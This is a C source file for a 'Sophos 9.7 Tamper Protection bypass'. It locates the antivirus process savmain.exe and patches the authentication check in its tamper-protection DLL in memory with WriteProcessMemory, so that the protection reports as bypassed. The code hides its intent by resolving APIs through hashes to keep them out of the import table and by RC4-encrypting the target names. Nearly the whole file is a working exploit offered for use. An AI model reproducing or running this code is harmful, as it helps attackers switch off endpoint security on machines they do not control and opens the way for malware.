// Sophos 9.7 Tamper Protection bypass v2.0
/*------
	Is authenticated check:
		564F84D9   |> \66:8B4424 04 MOV AX, WORD PTR [ESP+4] ;  set to FFFF = tamper protection bypassed
	Check authentication status routine:
		00456DE1 <>/$  6A 3C PUSH    3C ;  check auth
	Base address of Tamper Protection DLL:
		0x564F0000
	Offset in memory to authentication check:
		0x84D9
*/

#define _WIN32_WINNT 0x501
#pragma comment(lib, "imagehlp.lib")
#pragma comment(linker, "/filealign:0x200 /ignore:4078 /merge:.text=.data /merge:.rdata=.data")
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <imagehlp.h>
#include "api_handler.h"
#include "rc4.h"
#include "api_handler.cpp"
#include "rc4.cpp"

DWORD GetModuleBase(LPSTR lpModuleName, DWORD dwProcessId)
{
	MODULEENTRY32 lpModuleEntry = {0};
	HANDLE hSnapShot = CreateToolhelp32Snapshot( TH32CS_SNAPMODULE, dwProcessId );
	if(!hSnapShot)
		return NULL;

	lpModuleEntry.dwSize = sizeof(lpModuleEntry);
	BOOL bModule = Module32First( hSnapShot, &lpModuleEntry );
	while(bModule){
		if(!strcmp(lpModuleEntry.szModule, lpModuleName)){
			CloseHandle( hSnapShot );
			return (DWORD)lpModuleEntry.modBaseAddr;
		}
		bModule = Module32Next( hSnapShot, &lpModuleEntry );
	}
	
	CloseHandle(hSnapShot);
	return NULL;
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShow)
{
	PROCESSENTRY32 pe32;
    HANDLE hSnapshot, hProcess;
	int nStatus = 0;
	// patch bytes
	BYTE bPatch[5] = { 0x66, 0xB8, 0xFF, 0xFF, 0x90 };
	// RC4 Key
	char *szRC4Key = "KOrUPt";
	// TamperProtectionPlugin.dll
	char szTargetDll[] = "\xB3\x36\x2D\x49\x8F\xB1\x27\x51\x22\x0F\x6B\x6F\x8C\x55\x05\xC5\x0C\x84\x58\x64\xB5\xF9\x99\x90\x02\x1E";
	// savmain.exe
	char szTargetProcessName[] = "\x94\x36\x36\x54\x8B\xAA\x19\x0D\x28\x03\x6B";
	
	// stealthly resolve API's that may be considered suspicous if seen in our import table
	lpK32Base 			= GetK32Base();
	pWriteProcessMemory	= GetAPIAddress((HMODULE)lpK32Base, dwAPIHashTable[nWriteProcessMemory]);
	pOpenProcess 		= GetAPIAddress((HMODULE)lpK32Base, dwAPIHashTable[nOpenProcess]);
	// decrypt sensitive strings
	RC4((unsigned char *)szTargetDll, (unsigned char *)szRC4Key, strlen(szTargetDll), strlen(szRC4Key));
	RC4((unsigned char *)szTargetProcessName, (unsigned char *)szRC4Key, strlen(szTargetProcessName), strlen(szRC4Key));
	
	// find process and patch accordingly
	pe32.dwSize = sizeof(PROCESSENTRY32);
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if(hSnapshot != INVALID_HANDLE_VALUE){
		if(Process32First(hSnapshot, &pe32)){
			do{
				if(stricmp(pe32.szExeFile, szTargetProcessName) == 0){
					hProcess = sOpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, TRUE, pe32.th32ProcessID);
					if(hProcess){
						DWORD dwBaseAddress	 = GetModuleBase(szTargetDll, pe32.th32ProcessID);
						DWORD dwPatchAddress = dwBaseAddress + (0x7924 ^ 0xFDFD); // = 0x84D9 = offset
						sWriteProcessMemory(hProcess, (BYTE *)dwPatchAddress, bPatch, 5, NULL);
						CloseHandle(hProcess);
					}
					break;
				}
			}while(Process32Next(hSnapshot, &pe32));
		}
		CloseHandle(hSnapshot);
	}
	
	return nStatus;
}
